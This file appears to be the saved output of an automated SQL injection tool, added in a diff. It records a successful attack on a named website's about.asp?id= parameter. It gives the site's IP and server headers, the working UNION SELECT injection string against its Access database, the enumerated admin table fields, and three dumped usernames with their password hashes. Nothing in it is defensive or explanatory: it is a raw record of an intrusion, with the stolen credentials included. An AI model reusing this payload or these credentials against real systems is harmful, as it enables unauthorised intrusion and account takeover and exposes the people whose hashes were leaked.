@@ -1,0 +1,35 @@
+■漏洞信息:============================================================
+ ·URL:http://sanlongtie.com/about.asp?id=315
+ ·页面标题：
+ ·参数:id=315
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:58.211.73.35
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 22 Aug 2011 13:26:00 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 11223
+Content-Type: text/html; Charset=utf-8
+Set-Cookie: ASPSESSIONIDQSATTRRR=CHFLKFCBEOCOLFJLLPJCCLHC; path=/
+Cache-control: private
+
+
+联合查询列数: 总共= 32  显示的列= 2
+联合查询SQL: and 3=8 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 from MSysAccessObjects
+找到表:admin
+找到字段:admin.id
+找到字段:admin.user_pwd
+找到字段:admin.title
+找到字段:admin.user_name
+找到字段:admin.quanxian
+------------------------------------------------------------
+user_pwd		user_name		
+29BD2805B19A0B0E81660C0A49B4C325		tanglei
+3570E53B647853A684A450B18906AE61		admin
+A86579DF86A660C59CC264A23DB5D202		wansi
